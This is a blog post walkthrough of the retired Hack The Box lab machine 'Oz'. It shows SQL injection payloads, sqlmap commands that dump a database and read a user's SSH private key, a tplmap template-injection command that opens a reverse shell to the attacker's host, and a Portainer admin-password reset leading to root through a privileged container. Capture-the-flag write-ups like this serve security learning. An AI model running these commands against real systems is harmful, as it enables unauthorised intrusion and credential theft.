<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Oz - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Oz from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Oz">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/oz/">


  <meta property="og:description" content="My write-up / walkthrough for Oz from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Oz">
  <meta name="twitter:description" content="My write-up / walkthrough for Oz from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/oz/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-01-12T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/oz/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Oz">
    <meta itemprop="description" content="Hack The Box - OzQuick SummaryHey I’m back with another Hack The Box write-up , this time Oz has retired and it was rated as a hard box. I enjoyed this box , it was really fun. It had some docker tricks which were very cool , It’s a linux box and it’s ip is 10.10.10.96 so let’s jump right in.Check out my other Hack The Box write-upsNmapAs always we will start by running nmap to scan for open ports and services.nmap -sV -sT -o nmapinitial oz.htbNote : I added the ip to my /etc/hosts file as oz.htbAnd we see only http on port 80 and 8080. We also see that it’s running a python server.Enumerating httpOn port 80 there’s a web page with the title “OZ Webapi” and it’s asking us to register a username.On port 8080 we see a login page.If we tried running gobuster on port 80 to find hidden dirs and files we will get a wildcard response.And that’s because the server doesn’t respond with 404. Instead of 404 , when we request a non-existing page the server responds with a line of random chars.Here I requested http://oz.htb/anythingAnd this makes it hard to enumerate because we will always get a 200 response. So what are we going to do is to use wfuzz to filter the responses for us.wfuzz -u http://oz.htb/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl 0This won’t show us any response with 0 lines.After a few seconds we get /users/SQL InjectionWhen we visit /users/ in the browser we get the default response : please register a username.So we have /users/ which is a valid path , what happens if we tried a username that probably exists, something like admin ?We get a json response username : &quot;admin&quot; Let’s try a single quote 'We get 500 Internal Server Error, So this endpoint is probably vulnerable to SQL injection , Let’s try something else , 'OR 1 OR'We get another username : “dorthi” , So this is a confirmation that it’s vulnerable to sqli , Let’s do another injection and see if we can enumerate users ' or length(username)='4Another username : “toto”Let’s try 7 tin.man So we confirmed it’s sqli , The next step is to use sqlmap.sqlmap -u http://10.10.10.96/users/toto --allThis will dump the whole databaseAfter some time it will start dumping tables and we will notice an interesting table users_gbwSo if we try to crack those hashes the only one that will crack is wizard.oz : wizardofoz22Now we have a username and its password let’s login to port 8080And success !Dorthi’s ssh keyWe login to something that looks like a ticketing system, After reading the tickets we will find 2 interesting tickets.So this ssh key is on the database and we have sqli on that database , Let’s grab it.sqlmap -u &quot;http://10.10.10.96/users/toto&quot; --string &quot;username&quot; --file-read &quot;/home/dorthi/.ssh/id_rsa&quot; -v1Cool so now we can ssh and own user, No wait …By looking at the nmap scan again:There’s no ssh listening !Server Side Template InjectionIf we return to that ticketing system we will see that we can add a ticket , it asks us for a name and a description.By capturing that request in burp we will see a POST request with two parameters name and desc.And the response outputs them.If we used tplmap (a tool like sqlmap for automatic template injection exploitation) we will find that it’s vulnerable.python tplmap.py -u 'http://10.10.10.96:8080' -X POST -d 'name=*&amp;desc=anything' -c 'token=TOKEN' --reverse-shell 10.10.xx.xx 1337Then we check our listener , we will get a reverse shell.Knock , KnockAfter some enumeration we will find in / two unusual dirs containers and .secret , in .secret there is a file called knockd.conf That’s a configuration file for ssh port knocking, Port knocking means that in order to connect to an ssh server you need to ping some ports in a specific sequence to be able to connect.In our situation the ports are 40809 50212 46969 and all of them are udp.In the other dir containers there’s a dir called database which has some files, One of them is called start.shAnd we grabbed some passwords maybe we will need them later.Now we know the port sequence let’s ssh into the box. We can use knockd to do that but I used a small script that uses nmap.We chmod 600 to the key then execute our script.The key is protected with a password , Let’s try the db password we found earlier : “N0Pl4c3L1keH0me”And we owned user !PortainerAfter some regular enumeration if we do sudo -l we will find that dorthi can run some commands as root docker network ls and docker network inspect *Let’s first list the networks sudo docker network lsWe see some networks let’s inspect the first one bridgesudo docker network inspect bridgeWe find portainer-1.11.1 and its ip is 172.17.0.2 , Portainer is the user interface for docker management and it usually runs http on port 9000 , we can also check that by using nmap. Luckily it’s installed on the box.And we see that port 9000 is listening , so now we need to set up an ssh port forwarding to be able to access that portainer.We can edit the ssh port knocking script to add the forwarding command.Now when we visit localhost on port 9000 we get a login page.By using the HTTP API as documented here we can re-assign the admin password by sending a POST request to /api/users/admin/init with data as : {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;new-password&quot;}I did it with burp and set the password to l0c4l :RootAfter we login we will see the dashboard showing the status of the containers.In the containers tab there are 4 container running.If we check the container webapi we can use its console.We can create a new container with the image of webapi and mount /root or the whole filesystem / then use the console to access it.First we will grab the image name from the images tab : “webapi:latest”Then we will create a container and name it anything , I named it “NiceContainer” , add the image , then add a volume with path /root and mount it to /mnt/ Then from the security tab we choose privileged mode.Click create , Use the console , cd /mnt and we own root ! :DThat’s it , Feedback is appreciated !Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.previous Hack The Box write-up : Hack The Box - WaldoNext Hack The Box write-up : Hack The Box - SecNotes">
    <meta itemprop="datePublished" content="2019-01-12T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/oz/" class="u-url" itemprop="url">Hack The Box - Oz
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-01-12T07:00:00+02:00">January 12, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          5 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---oz">Hack The Box - Oz</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#enumerating-http">Enumerating http</a></li>
<li><a href="#sql-injection">SQL Injection</a></li>
<li><a href="#dorthis-ssh-key">Dorthi’s ssh key</a></li>
<li><a href="#server-side-template-injection">Server Side Template Injection</a></li>
<li><a href="#knock--knock">Knock , Knock</a></li>
<li><a href="#portainer">Portainer</a></li>
<li><a href="#root">Root</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---oz">Hack The Box - Oz</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey I’m back with another Hack The Box write-up , this time Oz has retired and it was rated as a hard box. I enjoyed this box , it was really fun. It had some docker tricks which were very cool , It’s a linux box and it’s ip is 10.10.10.96 so let’s jump right in.<br>
Check out my <a href="/categories">other Hack The Box write-ups</a>
<br><img src="/images/hackthebox/oz/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start by running nmap to scan for open ports and services.<br>
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -o nmapinitial oz.htb</code>
<br>Note : I added the ip to my /etc/hosts file as oz.htb
<br><img src="/images/hackthebox/oz/1.png" alt="" class="align-center"><br><br>
And we see only http on port 80 and 8080. We also see that it’s running a python server.<br></p>

<h2 id="enumerating-http">Enumerating http</h2>
<p>On port 80 there’s a web page with the title “OZ Webapi” and it’s asking us to register a username.<br>
<br><img src="/images/hackthebox/oz/2.png" alt="" class="align-center"><br><br>
On port 8080 we see a login page.<br>
<br><img src="/images/hackthebox/oz/3.png" alt="" class="align-center"><br><br>
If we tried running gobuster on port 80 to find hidden dirs and files we will get a wildcard response.<br>
<br><img src="/images/hackthebox/oz/4.png" alt="" class="align-center"><br><br>
And that’s because the server doesn’t respond with 404. Instead of 404 , when we request a non-existing page the server responds with a line of random chars.<br>
Here I requested <code class="language-plaintext highlighter-rouge">http://oz.htb/anything</code>
<br><img src="/images/hackthebox/oz/5.png" alt="" class="align-center"><br><br>
And this makes it hard to enumerate because we will always get a 200 response. So what are we going to do is to use wfuzz to filter the responses for us.<br>
<code class="language-plaintext highlighter-rouge">wfuzz -u http://oz.htb/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl 0</code>
This won’t show us any response with 0 lines.<br>
<br><img src="/images/hackthebox/oz/6.png" alt="" class="align-center"><br><br>
After a few seconds we get /users/</p>

<h2 id="sql-injection">SQL Injection</h2>
<p>When we visit /users/ in the browser we get the default response : please register a username.<br>
<br><img src="/images/hackthebox/oz/7.png" alt="" class="align-center"><br><br>
So we have /users/ which is a valid path , what happens if we tried a username that probably exists, something like admin ?
<br><img src="/images/hackthebox/oz/8.png" alt="" class="align-center"><br><br>
We get a json response <code class="language-plaintext highlighter-rouge">username : "admin"</code> 
Let’s try a single quote <code class="language-plaintext highlighter-rouge">'</code>
<br><img src="/images/hackthebox/oz/9.png" alt="" class="align-center"><br><br>
We get 500 Internal Server Error, So this endpoint is probably vulnerable to SQL injection , Let’s try something else , <code class="language-plaintext highlighter-rouge">'OR 1 OR'</code>
<br><img src="/images/hackthebox/oz/10.png" alt="" class="align-center"><br><br>
We get another username : “dorthi” , So this is a confirmation that it’s vulnerable to sqli , Let’s do another injection and see if we can enumerate users 
<code class="language-plaintext highlighter-rouge">' or length(username)='4</code>
<br><img src="/images/hackthebox/oz/11.png" alt="" class="align-center"><br><br>
Another username : “toto”
Let’s try 7 
<br><img src="/images/hackthebox/oz/12.png" alt="" class="align-center"><br><br>
tin.man 
So we confirmed it’s sqli , The next step is to use sqlmap.<br>
<code class="language-plaintext highlighter-rouge">sqlmap -u http://10.10.10.96/users/toto --all</code>
This will dump the whole database
<br><img src="/images/hackthebox/oz/13.png" alt="" class="align-center"><br><br>
After some time it will start dumping tables and we will notice an interesting table <code class="language-plaintext highlighter-rouge">users_gbw</code>
<br><img src="/images/hackthebox/oz/14.png" alt="" class="align-center"><br><br>
So if we try to crack those hashes the only one that will crack is wizard.oz : <code class="language-plaintext highlighter-rouge">wizardofoz22</code>
Now we have a username and its password let’s login to port 8080
<br><img src="/images/hackthebox/oz/15.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/oz/16.png" alt="" class="align-center"><br><br>
And success !</p>

<h2 id="dorthis-ssh-key">Dorthi’s ssh key</h2>
<p>We login to something that looks like a ticketing system, After reading the tickets we will find 2 interesting tickets.<br>
<br><img src="/images/hackthebox/oz/17.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/oz/18.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/oz/19.png" alt="" class="align-center"><br><br>
So this ssh key is on the database and we have sqli on that database , Let’s grab it.<br>
<code class="language-plaintext highlighter-rouge">sqlmap -u "http://10.10.10.96/users/toto" --string "username" --file-read "/home/dorthi/.ssh/id_rsa" -v1</code>
<br><img src="/images/hackthebox/oz/20.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/oz/21.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/oz/22.png" alt="" class="align-center"><br><br>
Cool so now we can ssh and own user, No wait …<br>
By looking at the nmap scan again:
<br><img src="/images/hackthebox/oz/1.png" alt="" class="align-center"><br><br>
There’s no ssh listening !</p>

<h2 id="server-side-template-injection">Server Side Template Injection</h2>
<p>If we return to that ticketing system we will see that we can add a ticket , it asks us for a name and a description.<br>
<br><img src="/images/hackthebox/oz/23.png" alt="" class="align-center"><br><br>
By capturing that request in burp we will see a POST request with two parameters name and desc.<br>
<br><img src="/images/hackthebox/oz/24.png" alt="" class="align-center"><br><br>
And the response outputs them.<br>
<br><img src="/images/hackthebox/oz/25.png" alt="" class="align-center"><br><br>
If we used <a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener noreferrer">tplmap</a> (a tool like sqlmap for automatic template injection exploitation) we will find that it’s vulnerable.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python tplmap.py -u 'http://10.10.10.96:8080' -X POST -d 'name=*&amp;desc=anything' -c 'token=TOKEN' --reverse-shell 10.10.xx.xx 1337
</code></pre></div></div>
<p><br><img src="/images/hackthebox/oz/26.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/oz/27.png" alt="" class="align-center"><br><br>
Then we check our listener , we will get a reverse shell.<br></p>

<h2 id="knock--knock">Knock , Knock</h2>
<p>After some enumeration we will find in <code class="language-plaintext highlighter-rouge">/</code> two unusual dirs <code class="language-plaintext highlighter-rouge">containers</code> and <code class="language-plaintext highlighter-rouge">.secret</code> , in <code class="language-plaintext highlighter-rouge">.secret</code> there is a file called <code class="language-plaintext highlighter-rouge">knockd.conf</code> 
<br><img src="/images/hackthebox/oz/28.png" alt="" class="align-center"><br><br>
That’s a configuration file for ssh port knocking, Port knocking means that in order to connect to an ssh server you need to ping some ports in a specific sequence to be able to connect.<br>
<br><img src="/images/hackthebox/oz/29.png" alt="" class="align-center"><br><br>
In our situation the ports are 40809 50212 46969 and all of them are udp.
<br>In the other dir <code class="language-plaintext highlighter-rouge">containers</code> there’s a dir called <code class="language-plaintext highlighter-rouge">database</code> which has some files, One of them is called <code class="language-plaintext highlighter-rouge">start.sh</code>
<br><img src="/images/hackthebox/oz/30.png" alt="" class="align-center"><br><br>
And we grabbed some passwords maybe we will need them later.<br>
Now we know the port sequence let’s ssh into the box. We can use knockd to do that but I used a small script that uses nmap.<br>
<br><img src="/images/hackthebox/oz/31.png" alt="" class="align-center"><br><br>
We <code class="language-plaintext highlighter-rouge">chmod 600</code> to the key then execute our script.<br>
<br><img src="/images/hackthebox/oz/32.png" alt="" class="align-center"><br><br>
The key is protected with a password , Let’s try the db password we found earlier : “N0Pl4c3L1keH0me”
<br><img src="/images/hackthebox/oz/33.png" alt="" class="align-center"><br><br>
And we owned user !</p>

<h2 id="portainer">Portainer</h2>
<p>After some regular enumeration if we do sudo -l we will find that dorthi can run some commands as root <code class="language-plaintext highlighter-rouge">docker network ls</code> and <code class="language-plaintext highlighter-rouge">docker network inspect *</code>
<br><img src="/images/hackthebox/oz/34.png" alt="" class="align-center"><br><br>
Let’s first list the networks 
<br><code class="language-plaintext highlighter-rouge">sudo docker network ls</code>
<br><img src="/images/hackthebox/oz/35.png" alt="" class="align-center"><br><br>
We see some networks let’s inspect the first one <code class="language-plaintext highlighter-rouge">bridge</code>
<br><code class="language-plaintext highlighter-rouge">sudo docker network inspect bridge</code>
<br><img src="/images/hackthebox/oz/36.png" alt="" class="align-center"><br><br>
We find <code class="language-plaintext highlighter-rouge">portainer-1.11.1</code> and its ip is <code class="language-plaintext highlighter-rouge">172.17.0.2</code> , Portainer is the user interface for docker management and it usually runs http on port 9000 , we can also check that by using nmap. Luckily it’s installed on the box.<br>
<br><img src="/images/hackthebox/oz/37.png" alt="" class="align-center"><br><br>
And we see that port 9000 is listening , so now we need to set up an ssh port forwarding to be able to access that portainer.<br>
We can edit the ssh port knocking script to add the forwarding command.<br>
<br><img src="/images/hackthebox/oz/38.png" alt="" class="align-center"><br><br>
Now when we visit localhost on port 9000 we get a login page.<br>
<br><img src="/images/hackthebox/oz/39.png" alt="" class="align-center"><br><br>
By using the HTTP API as documented <a href="https://gist.github.com/deviantony/77026d402366b4b43fa5918d41bc42f8" target="_blank" rel="noopener noreferrer">here</a> we can re-assign the admin password by sending a POST request to <code class="language-plaintext highlighter-rouge">/api/users/admin/init</code> with data as : <code class="language-plaintext highlighter-rouge">{"username":"admin","password":"new-password"}</code>
I did it with burp and set the password to <code class="language-plaintext highlighter-rouge">l0c4l</code> :
<br><img src="/images/hackthebox/oz/40.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/oz/41.png" alt="" class="align-center"><br><br></p>

<h2 id="root">Root</h2>
<p>After we login we will see the dashboard showing the status of the containers.<br>
<br><img src="/images/hackthebox/oz/42.png" alt="" class="align-center"><br><br>
In the containers tab there are 4 container running.<br>
<br><img src="/images/hackthebox/oz/43.png" alt="" class="align-center"><br><br>
If we check the container webapi we can use its console.<br>
<br><img src="/images/hackthebox/oz/44.png" alt="" class="align-center"><br><br>
We can create a new container with the image of webapi and mount <code class="language-plaintext highlighter-rouge">/root</code> or the whole filesystem <code class="language-plaintext highlighter-rouge">/</code> then use the console to access it.<br>
First we will grab the image name from the images tab : “webapi:latest”
<br><img src="/images/hackthebox/oz/45.png" alt="" class="align-center"><br><br>
Then we will create a container and name it anything , I named it “NiceContainer” , add the image , then add a volume with path <code class="language-plaintext highlighter-rouge">/root</code> and mount it to <code class="language-plaintext highlighter-rouge">/mnt/</code> 
<br><img src="/images/hackthebox/oz/46.png" alt="" class="align-center"><br><br>
Then from the security tab we choose privileged mode.<br>
<br><img src="/images/hackthebox/oz/47.png" alt="" class="align-center"><br><br>
Click create , Use the console , <code class="language-plaintext highlighter-rouge">cd /mnt</code> and we own root ! :D
<br><img src="/images/hackthebox/oz/48.png" alt="" class="align-center"><br><br></p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>previous Hack The Box write-up : <a href="/hack-the-box/waldo/">Hack The Box - Waldo</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/secnotes/">Hack The Box - SecNotes</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-01-12T07:00:00+02:00">January 12, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/binary-exploitation/bof3/" class="pagination--pager" title="Buffer Overflow Examples, Overwriting a function pointer - protostar stack3
">Previous</a>
    
    
      <a href="/binary-exploitation/bof4/" class="pagination--pager" title="Buffer Overflow Examples, Taking control of the instruction pointer - protostar stack4
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
